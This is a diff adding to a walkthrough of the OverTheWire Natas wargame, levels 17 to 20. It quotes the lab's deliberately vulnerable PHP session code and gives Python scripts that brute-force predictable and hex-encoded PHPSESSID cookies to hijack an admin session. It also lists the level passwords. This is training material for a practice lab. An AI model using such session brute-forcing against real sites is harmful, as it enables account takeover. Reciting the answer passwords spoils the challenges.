@@ -633,6 +633,269 @@ while len(password) < 32:
 ```
 Thus we obtain the password as: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 
+# Level 17 -> Level 18:
+
+user: natas18
+pass: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
++ When we login with the above credentials, we get a username and password for which says `Please login with your admin account to retrieve credentials for natas19.`
++ Source code given:
+```
+<?
+
+$maxid = 640; // 640 should be enough for everyone
+
+function isValidAdminLogin() { /* {{{ */
+    if($_REQUEST["username"] == "admin") {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
+    }
+
+    return 0;
+}
+/* }}} */
+function isValidID($id) { /* {{{ */
+    return is_numeric($id);
+}
+/* }}} */
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+/* }}} */
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function my_session_start() { /* {{{ */
+    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+    if(!session_start()) {
+        debug("Session start failed");
+        return false;
+    } else {
+        debug("Session start ok");
+        if(!array_key_exists("admin", $_SESSION)) {
+        debug("Session was old: admin flag set");
+        $_SESSION["admin"] = 0; // backwards compatible, secure
+        }
+        return true;
+    }
+    }
+
+    return false;
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas19\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+    }
+}
+/* }}} */
+
+$showform = true;
+if(my_session_start()) {
+    print_credentials();
+    $showform = false;
+} else {
+    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+    session_id(createID($_REQUEST["username"]));
+    session_start();
+    $_SESSION["admin"] = isValidAdminLogin();
+    debug("New session started");
+    $showform = false;
+    print_credentials();
+    }
+} 
+
+if($showform) {
+?>
+```
++ When we login with some username and password it gives this message. `You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.`
++ So, when looked into the cookie, we can see a `phpsessionid` and for me the value was 126. 
++ So, what we want to do is, we need to bruteforce the value of phpsessionid for admin to get the password of the next level. For that we can write a simple python scipt
+```
+import requests
+
+url = "http://natas18.natas.labs.overthewire.org"
+url2 = "http://natas18.natas.labs.overthewire.org/index.php"
+
+s = requests.Session()
+s.auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
+r = s.get(url)
+
+for x in range(640):
+    cookies = dict(PHPSESSID=str(x))
+    r = s.get(url2, cookies=cookies)
+    if "Login as an admin to retrieve" in r.text:
+        pass
+    else:
+        print(r.text)
+        break
+	
+```
+When I ran the above script we got the password for the next level
+pass: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+
+# Level 18 -> level 19:
+
+user: natas19
+pass: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
++ When we login with the above credentials, we got a similar page as previous level, but it says `This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+
+Please login with your admin account to retrieve credentials for natas20.`
++ Source code is not given.
++ When I logged in as user: admin and pass: admin, the phpsessionid looks like this `3131312d61646d696e`. This is in ascii format.
++ When I decoded the ascii, i got `111-admin`
++ I slightly changed the previous python scipt and to obtain the password of next level
+```
+import requests
+import binascii
+
+url = "http://natas19.natas.labs.overthewire.org"
+
+s = requests.Session()
+s.auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
+
+for x in range(1000):
+    tmp = str(x) + "-admin"
+    val = binascii.hexlify(tmp.encode('utf-8'))
+
+    cookies = dict(PHPSESSID=val.decode('ascii'))
+    r = s.get(url, cookies=cookies)
+    if "Login as an admin to retrieve" in r.text:
+        pass
+    else:
+        print(r.text)
+        break
+```
+Running the above python script gave us the password for next level.
+pass: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
+#  Level 19 -> Level 20:
+
+user: natas20
+pass: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
++ When we login with above credentials, we get a form for entering username and it says `You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.`
++ Source code is given:
+```
+<?
+
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+/* }}} */
+
+/* we don't need this */
+function myopen($path, $name) { 
+    //debug("MYOPEN $path $name"); 
+    return true; 
+}
+
+/* we don't need this */
+function myclose() { 
+    //debug("MYCLOSE"); 
+    return true; 
+}
+
+function myread($sid) { 
+    debug("MYREAD $sid"); 
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode();
+}
+
+function mywrite($sid, $data) { 
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data"); 
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+}
+
+/* we don't need this */
+function mydestroy($sid) {
+    //debug("MYDESTROY $sid"); 
+    return true; 
+}
+/* we don't need this */
+function mygarbage($t) { 
+    //debug("MYGARBAGE $t"); 
+    return true; 
+}
+
+session_set_save_handler(
+    "myopen", 
+    "myclose", 
+    "myread", 
+    "mywrite", 
+    "mydestroy", 
+    "mygarbage");
+session_start();
+
+if(array_key_exists("name", $_REQUEST)) {
+    $_SESSION["name"] = $_REQUEST["name"];
+    debug("Name set to " . $_REQUEST["name"]);
+}
+
+print_credentials();
+
+$name = "";
+if(array_key_exists("name", $_SESSION)) {
+    $name = $_SESSION["name"];
+}
+
+?>
+```
+
++ Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+
+
 
     
 
